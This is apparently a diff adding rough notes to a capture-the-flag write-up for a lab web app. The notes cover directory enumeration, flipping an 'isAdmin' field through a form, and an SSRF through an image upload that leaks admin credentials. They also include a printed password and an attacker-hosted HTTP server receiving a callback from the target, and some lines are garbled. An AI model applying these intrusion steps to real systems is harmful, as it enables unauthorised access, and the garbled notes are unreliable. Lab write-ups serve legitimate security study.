@@ -130,3 +130,24 @@ Starting gobuster in directory enumeration mode
 /javascript           (Status: 301) [Size: 322] [--> http://10.10.94.1:50000/javascript/]
 /phpmyadmin           (Status: 403) [Size: 278]
 /server-status        (Status: 403) [Size: 278]
+
+This client side JS code snippet clues us that the recommend an activity upload form MIGHT affect the profile details, obviously we are after "isAdmin" field
+
+form class="mb-4"> <h2 class="mb-3">Friend Details</h2> <ul class="list-group"> <li class="list-group-item"> id: 1 </li> <li class="list-group-item"> name: &#34;guest&#34; </li> <li class="list-group-item"> age: 25 </li> <li class="list-group-item"> country: &#34;UK&#34; </li> <li class="list-group-item"> albums: [{&#34;name&#34;:&#34;USA Trip&#34;,&#34;photos&#34;:&#34;www.thm.me&#34;}] </li> <li class="list-group-item"> isAdmin: false </li> <li class="list-group-item"> profileImage: &#34;/images/prof1.avif&#34; </li> </ul> </form> <!-- Recommend Activity Form --> <form action="/recommend-activity/1" method="post" class="mb-4"> <h2 class="mb-3">Recommend an Activity to guest </h2> <div class="form-group"> <input type="text" class="form-control" name="activityType" placeholder="Activity Type (e.g., Favorite Book)"> </div> <div class="form-group"> <input type="text" class="form-control" name="activityName" placeholder="Activity Name (e.g., 1984)"> </div> <button type="submit" class="btn btn-primary">Recommend Activity</button> </form>
+
+surely enough the CTF CTF's
+
+when feeding admin API GET HTTP command to the image upload secution of INCLUDE_IP:4000 you get the following response (in base 64 but that is easy to convert) from the picture upload form
+
+{"ReviewAppUsername":"admin","ReviewAppPassword":"admin@!!!","SysMonAppUsername":"administrator","SysMonAppPassword":"S$9$qk6d#**LQU"}
+
+which when you login to the sysmon portal with the sysmon creds dumped here 
+
+┌──(kali㉿kali)-[~]
+└─$ python3 -m http.server 8080
+Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
+10.10.91.131 - - [14/Jul/2025 21:11:52] "GET /confirmed.txt HTTP/1.1" 200 -
+@
+http://10.10.91.131:4000/admin/settings
+
+view-source:http://10.10.91.131:50000/profile.php?img=profile.png
